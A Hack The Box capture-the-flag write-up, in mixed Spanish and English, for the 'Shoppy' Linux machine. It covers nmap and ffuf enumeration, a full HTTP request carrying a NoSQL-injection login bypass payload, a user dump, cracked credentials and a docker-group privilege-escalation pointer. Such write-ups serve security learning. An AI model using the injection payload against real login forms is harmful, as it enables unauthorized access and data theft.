---
description: Linux · Easy
---

# Shoppy

## Reconocimiento

```bash
nmap -sC -sV -oA ./nmap/shoppy 10.10.11.180
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-25 18:25 EST
Nmap scan report for 10.10.11.180
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.81 seconds

```

Se descubrió dos puertos el `22/tcp` que por default es SSH y el puerto `80/tcp` que es HTTP,el servidor corre con Nginx 1.23.1.Tambien aparece `shoppy.htb`

Debemos agregar la URL en `/etc/hosts`

## Enumeracion

### Webserver

We start with the enumeration of the website. We visit the website through the URL `http://shoppy.htb`.

```bash
 ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://shoppy.htb/FUZZ
```

```bash

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 40ms]
ADMIN                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 54ms]
Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 59ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 44ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 58ms]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 40ms]
exports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 30ms]
favicon.ico             [Status: 200, Size: 213054, Words: 56, Lines: 89, Duration: 32ms]
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 31ms]
images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 28ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 43ms]
login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 46ms]
:: Progress: [20469/20469] :: Job [1/1] :: 1031 req/sec :: Duration: [0:00:21] :: Errors: 0 ::

```

Nice! We have found a login page on `http://shoppy.htb/login`. To login, we need valid credentials. We do not currently have those credentials. Also, the location `http://shoppy.htb/exports` is interessting, but we cannot extract any information from this URL right now, maybe later on in this machine.



## Acceder

### Access as admin webportal

If we are using a single quote (`'`) in the username field, we receive a `504 Gateway Time-out`. We have our first error message. We need to perform some more enumeration. This part of the machine, was the most confusing part of this box. It took me some time to find out how to get a foothold on this machine.

The error message shows the URL `http://shoppy.htb/login?error=WrongCredentials`

Let’s try various payloads in the login form. After a long time of trying, we are able to find the right payload to bypass the login mechanism through BurpSuite.

```
POST /login HTTP/1.1
Host: shoppy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://shoppy.htb
Connection: close
Referer: http://shoppy.htb/login
Upgrade-Insecure-Requests: 1

username=admin'||'1==1//&password=toto

```

After logging in, we are redirected to `http://shoppy.htb/admin`

From this page, we can search for users. We can search for the user `admin`, and received the password for this user account. We’ve tried to crack this password, but it seems it is uncrackable. After filling in the payload `'||'1==1//` in the search bar (payload always trye), it shows all existing user accounts in the databse.

Let’s try to crack the password of the useraccount `john`.

We have found the password `remembermethisway`. With this password I’ve tried to login through SSH with this password, but no luck. After enumerating around, we found an extra sub-domain `http://mattermost.shoppy.htb`, using `ffuf`.

We cannot now login with the user `josh` with the cracked password.

After looking around, we find the credentials for the user account `jaeger` with the password `Sh0ppyBest@pp!`.

## SSH access as jaeger <a href="#ssh-access-as-jaeger" id="ssh-access-as-jaeger"></a>

With this user account, we can access the machine through SSH and grab the user flag.

## Lateral Movement <a href="#lateral-movement" id="lateral-movement"></a>

### Move from jaeger to deploy

This user account has the permission to run `/home/deploy/password-manager` on behalf of the user account `deploy`.

After executing this program, it’s asking for a master password. As we are able to run the program, we can also try to read the program.

It seems that the password is: `Sample`.

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Yes! We have now the credentials for the user account `deploy`. We can switch to this user account and run `linpeas.sh`.

## Exploit docker <a href="#exploit-docker" id="exploit-docker"></a>

The user account `deploy` is in the `docker` group. Through [GTFObins](https://gtfobins.github.io/gtfobins/docker/) we can find the path to privilege escalation.

Thanks for reading this write-up! Did you enjoy reading this write-up? Or learned something from it? Please consider spending a respect point: [https://app.hackthebox.com/profile/224856.com/profile/224856](https://app.hackthebox.com/profile/224856.com/profile/224856). Thanks!
